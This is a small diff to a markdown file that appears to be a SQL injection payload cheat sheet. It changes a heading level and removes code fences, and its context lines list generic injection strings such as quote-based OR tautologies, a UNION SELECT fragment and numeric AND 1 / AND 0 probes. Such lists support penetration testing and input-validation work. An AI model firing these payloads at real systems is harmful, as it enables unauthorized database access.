@@ -1,4 +1,4 @@
-## Generic SQL Injection Payloads
+#### Generic SQL Injection Payloads
 
 ```cadence
 ' or "
@@ -12,11 +12,9 @@
  ' OR 'x'='x
  ' AND id IS NULL; --
  '''''''''''''UNION SELECT '2
-```
 
 \# Numeric
 
-```cadence
 AND 1
 AND 0
 AND true
